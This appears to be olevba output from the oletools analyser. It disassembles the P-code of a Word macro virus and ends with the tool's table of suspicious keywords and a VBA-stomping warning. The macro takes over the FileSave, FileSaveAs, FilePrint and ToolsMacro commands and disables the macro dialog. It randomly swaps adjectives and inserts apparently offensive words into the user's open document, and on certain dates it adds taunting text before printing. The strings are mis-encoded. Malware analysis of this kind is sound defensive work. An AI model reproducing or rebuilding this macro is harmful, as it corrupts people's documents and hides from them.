' 	LitDI2 0x000A 
' 	ArgsSt Moora2$ 0x0001 
' Line #163:
' Line #164:
' 	LitStr 0x0003 "摠�"
' 	LitDI2 0x0001 
' 	ArgsSt Bls$ 0x0001 
' Line #165:
' 	LitStr 0x0008 "� 縺覷謥"
' 	LitDI2 0x0002 
' 	ArgsSt Bls$ 0x0001 
' Line #166:
' 	LitStr 0x0009 "蠋鞜 憵譔"
' 	LitDI2 0x0003 
' 	ArgsSt Bls$ 0x0001 
' Line #167:
' Line #168:
' 	EndSub 
' Line #169:
' Line #170:
' 	FuncDefn (Sub Optimize())
' Line #171:
' 	ArgsCall AutoExec 0x0000 
' Line #172:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #173:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	St False 
' Line #174:
' 	Reparse 0x0026 " If UCase$(Mid$(f, 1, 3)) = "倬�" Then"
' Line #175:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St sz 
' Line #176:
' 	LitVarSpecial (False)
' 	St Changed 
' Line #177:
' 	LitDI2 0x0000 
' 	St Optima 
' Line #178:
' 	Ld sz 
' 	LitDI2 0x01F4 
' 	Le 
' 	IfBlock 
' Line #179:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld sz 
' 	For 
' Line #180:
' 	Ld k 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	ArgsMemLd Item 0x0001 
' 	St tss$ 
' Line #181:
' 	LitStr 0x0019 "砐鳲闅鍒罻 � 勷臝鳧樇噮: "
' 	Ld k 
' 	LitDI2 0x0005 
' 	IDiv 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "%"
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #182:
' 	Ld tss$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoSub Do_Trunslate 
' 	EndIf 
' Line #183:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #184:
' 	ElseBlock 
' Line #185:
' 	LitDI2 0x0001 
' 	St li 
' Line #186:
' 	Ld li 
' 	LitDI2 0x0064 
' 	Lt 
' 	While 
' Line #187:
' 	Ld sz 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St k 
' Line #188:
' 	Ld k 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	ArgsMemLd Item 0x0001 
' 	St tss$ 
' Line #189:
' 	Ld tss$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #190:
' 	GoSub Do_Trunslate 
' Line #191:
' 	Ld li 
' 	LitDI2 0x0001 
' 	Add 
' 	St li 
' Line #192:
' 	LitStr 0x0019 "砐鳲闅鍒罻 � 勷臝鳧樇噮: "
' 	Ld li 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "%"
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	Wend 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	LitStr 0x0023 "砐鳲闅鍒罻 諘瞂蹢樇�. 昜蠂擯諘灕�: "
' 	Ld Optima 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "%"
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	GoTo end_proc 
' Line #199:
' Line #200:
' 	Label Do_Trunslate 
' Line #201:
' 	Ld tss$ 
' 	ArgsLd TrunslateWord 0x0001 
' 	St tss$ 
' Line #202:
' 	Ld Changed 
' 	IfBlock 
' Line #203:
' 	Ld tss$ 
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemSt Words 0x0001 
' Line #204:
' 	LitVarSpecial (False)
' 	St Changed 
' Line #205:
' 	Ld Optima 
' 	LitDI2 0x0001 
' 	Add 
' 	St Optima 
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	Return 
' Line #208:
' 	Label end_proc 
' Line #209:
' 	EndSub 
' Line #210:
' Line #211:
' 	FuncDefn (Function TrunslateWord(ts As String))
' Line #212:
' 	Ld ts 
' 	St tw$ 
' Line #213:
' 	Ld ts 
' 	ArgsLd CheckSpace 0x0001 
' 	St spaces 
' Line #214:
' 	Ld spaces 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ts 
' 	LitDI2 0x0001 
' 	Ld ts 
' 	FnLen 
' 	Ld spaces 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St ts 
' 	EndIf 
' Line #215:
' 	Ld ts 
' 	FnLen 
' 	St Lts 
' Line #216:
' 	Ld Lts 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #217:
' 	Ld ts 
' 	ArgsLd CheckAdjective 0x0001 
' 	IfBlock 
' Line #218:
' 	LitDI2 0x0001 
' 	St c 
' Line #219:
' 	Ld c 
' 	LitDI2 0x0002 
' 	Le 
' 	While 
' Line #220:
' 	LitDI2 0x0001 
' 	St i 
' Line #221:
' 	Ld i 
' 	LitDI2 0x000C 
' 	Le 
' 	While 
' Line #222:
' 	Ld c 
' 	Ld i 
' 	ArgsLd ends$ 0x0002 
' 	St CEnd$ 
' Line #223:
' 	Ld ts 
' 	Ld Lts 
' 	Ld CEnd$ 
' 	FnLen 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld CEnd$ 
' 	FnLen 
' 	ArgsLd Mid$$ 0x0003 
' 	St MyEnd$ 
' Line #224:
' 	Ld MyEnd$ 
' 	Ld CEnd$ 
' 	Eq 
' 	IfBlock 
' Line #225:
' 	LitVarSpecial (True)
' 	St Changed 
' Line #226:
' 	Ld c 
' 	SelectCase 
' Line #227:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #228:
' 	LitDI2 0x0022 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Moora1$ 0x0001 
' 	Ld CEnd$ 
' 	Add 
' 	St tw$ 
' Line #229:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #230:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Moora2$ 0x0001 
' 	Ld CEnd$ 
' 	Add 
' 	St tw$ 
' Line #231:
' 	EndSelect 
' Line #232:
' 	Ld spaces 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld tw$ 
' 	Ld spaces 
' 	ArgsLd Space 0x0001 
' 	Add 
' 	St tw$ 
' 	EndIf 
' Line #233:
' 	Ld ts 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St FLett 
' Line #234:
' 	Ld FLett 
' 	ArgsLd UCase$ 0x0001 
' 	Ld FLett 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld tw$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	Ld tw$ 
' 	LitDI2 0x0002 
' 	Ld tw$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St tw$ 
' 	EndIf 
' Line #235:
' 	LitDI2 0x000C 
' 	St i 
' Line #236:
' 	LitDI2 0x0002 
' 	St c 
' Line #237:
' 	EndIfBlock 
' Line #238:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #239:
' 	Wend 
' Line #240:
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St c 
' Line #241:
' 	Wend 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	EndIfBlock 
' Line #244:
' 	Ld tw$ 
' 	St TrunslateWord$ 
' Line #245:
' 	EndFunc 
' Line #246:
' Line #247:
' 	FuncDefn (Function CheckSpace(csp As String) As Integer)
' Line #248:
' 	LitDI2 0x0000 
' 	St spp 
' Line #249:
' 	Ld csp 
' 	FnLen 
' 	St n 
' Line #250:
' 	Ld n 
' 	LitDI2 0x0003 
' 	Gt 
' 	IfBlock 
' Line #251:
' 	Ld csp 
' 	Ld n 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Paren 
' 	Ld n 
' 	LitDI2 0x0003 
' 	Gt 
' 	Paren 
' 	And 
' 	While 
' Line #252:
' 	Ld n 
' 	LitDI2 0x0001 
' 	Sub 
' 	St n 
' Line #253:
' 	Ld spp 
' 	LitDI2 0x0001 
' 	Add 
' 	St spp 
' Line #254:
' 	Wend 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	Ld spp 
' 	St CheckSpace 
' Line #257:
' 	EndFunc 
' Line #258:
' Line #259:
' Line #260:
' 	FuncDefn (Function MyDate() As Boolean)
' Line #261:
' 	Ld Date$ 
' 	St dt$ 
' Line #262:
' 	LitDI2 0x0001 
' 	Ld dt$ 
' 	LitStr 0x0002 "15"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MyDate 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St MyDate 
' 	EndIf 
' Line #263:
' 	EndFunc 
' Line #264:
' Line #265:
' Line #266:
' 	FuncDefn (Function CheckAdjective(adj As String) As Boolean)
' Line #267:
' 	LitVarSpecial (False)
' 	St cadj 
' Line #268:
' 	LitVarSpecial (True)
' 	St NoSpecial 
' Line #269:
' 	Ld adj 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd LCase$ 0x0001 
' 	St atj$ 
' Line #270:
' 	Ld atj$ 
' 	SelectCase 
' Line #271:
' 	LitStr 0x0006 "樉槼�""
' 	Case 
' 	CaseDone 
' Line #272:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #273:
' 	LitStr 0x0006 "馯黽�""
' 	Case 
' 	CaseDone 
' Line #274:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #275:
' 	LitStr 0x0006 "鶇鍒�""
' 	Case 
' 	CaseDone 
' Line #276:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #277:
' 	LitStr 0x0006 "縺鼨�""
' 	Case 
' 	CaseDone 
' Line #278:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #279:
' 	EndSelect 
' Line #280:
' 	Ld atj$ 
' 	ArgsLd NoFuckenError 0x0001 
' 	IfBlock 
' Line #281:
' 	SetStmt 
' 	Ld adj 
' 	ArgsLd SynonymInfo 0x0001 
' 	Set mySynInfo 
' Line #282:
' 	Ld mySynInfo 
' 	MemLd PartOfSpeechList 
' 	St myPos 
' Line #283:
' 	Ld myPos 
' 	FnUBound 0x0000 
' 	St i 
' Line #284:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	ArgsLd myPos 0x0001 
' 	Ld wdAdjective 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St cadj 
' 	EndIf 
' 	EndIf 
' Line #285:
' 	Reparse 0x0004 " Imp"
' Line #286:
' 	Ld cadj 
' 	St CheckAdjective 
' Line #287:
' 	EndFunc 
' Line #288:
' Line #289:
' 	FuncDefn (Function NoFuckenError(wrd As String) As Boolean)
' Line #290:
' 	Ld wrd 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St atj 
' Line #291:
' 	Ld atj 
' 	SelectCase 
' Line #292:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #293:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #294:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #295:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #296:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #297:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #298:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #299:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #300:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #301:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #302:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #303:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #304:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #305:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #306:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #307:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #308:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #309:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #310:
' 	LitStr 0x0002 "�""
' 	Case 
' 	CaseDone 
' Line #311:
' 	LitVarSpecial (False)
' 	St NoSpecial 
' Line #312:
' 	EndSelect 
' Line #313:
' 	Ld NoSpecial 
' 	St NoFuckenError 
' Line #314:
' 	EndFunc 
' Line #315:
' Line #316:
' 	FuncDefn (Sub FileSave())
' Line #317:
' 	LitStr 0x0008 "FileSave"
' 	ParamNamed MacN 
' 	ArgsCall RunOtherMacro 0x0001 
' Line #318:
' 	OnError Save_err 
' Line #319:
' 	ArgsCall AutoClose 0x0000 
' Line #320:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #321:
' 	Label Save_err 
' Line #322:
' 	EndSub 
' Line #323:
' Line #324:
' 	FuncDefn (Sub FileSaveAs())
' Line #325:
' 	LitStr 0x0009 "FleSaveAs"
' 	ParamNamed MacN 
' 	ArgsCall RunOtherMacro 0x0001 
' Line #326:
' 	OnError SaveAs_err 
' Line #327:
' 	ArgsCall AutoClose 0x0000 
' Line #328:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #329:
' 	Label SaveAs_err 
' Line #330:
' 	EndSub 
' Line #331:
' Line #332:
' 	FuncDefn (Sub FilePrint())
' Line #333:
' 	Ld MyDate 
' 	IfBlock 
' Line #334:
' 	ArgsCall MakeInsert 0x0000 
' Line #335:
' 	Ld Selection 
' 	MemLd Sentences 
' 	MemLd Count 
' 	St sc 
' Line #336:
' 	Ld sc 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' Line #337:
' 	LitStr 0x0020 " 鎚�, 珂Ь纖 ! (end of document)"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Last 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #338:
' 	ElseBlock 
' Line #339:
' 	LitStr 0x0029 " 扰鍎� 襜蜦, 劌憵� 瘔� 縺儋 瀁澽� 縺 蘦�!"
' 	Paren 
' 	Ld Selection 
' 	MemLd Words 
' 	MemLd Last 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #340:
' 	EndIfBlock 
' Line #341:
' 	EndIfBlock 
' Line #342:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #343:
' 	EndSub 
' Line #344:
' Line #345:
' 	FuncDefn (Sub ToolsMacro())
' Line #346:
' 	ArgsCall Beep 0x0000 
' Line #347:
' 	Rem 0x0022 "  Dialogs(wdDialogToolsMacro).Show"
' Line #348:
' 	EndSub 
' Line #349:
' Line #350:
' 	FuncDefn (Sub MakeInsert())
' Line #351:
' 	ArgsCall AutoExec 0x0000 
' Line #352:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #353:
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	St False 
' Line #354:
' 	Reparse 0x0026 " If UCase$(Mid$(f, 1, 3)) = "倬�" Then"
' Line #355:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St sz 
' Line #356:
' 	Ld sz 
' 	LitDI2 0x01F4 
' 	Gt 
' 	IfBlock 
' Line #357:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0032 
' 	For 
' Line #358:
' 	LitStr 0x000C "砐鳲闅鍒罻: "
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #359:
' 	Ld sz 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St k 
' Line #360:
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St tss$ 
' Line #361:
' 	Ld tss$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #362:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St tss1$ 
' Line #363:
' 	Ld tss1$ 
' 	FnLen 
' 	LitDI2 0x0004 
' 	Gt 
' 	IfBlock 
' Line #364:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #365:
' 	LitStr 0x0002 ", "
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Bls$ 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	St blya$ 
' Line #366:
' 	Ld blya$ 
' 	Paren 
' 	Ld k 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #367:
' 	EndIfBlock 
' Line #368:
' 	EndIfBlock 
' Line #369:
' 	EndIfBlock 
' Line #370:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #371:
' 	LitStr 0x0007 "鏝襜碭."
' 	Ld Application 
' 	MemSt StatusBar 
' Line #372:
' 	EndIfBlock 
' Line #373:
' 	EndIfBlock 
' Line #374:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

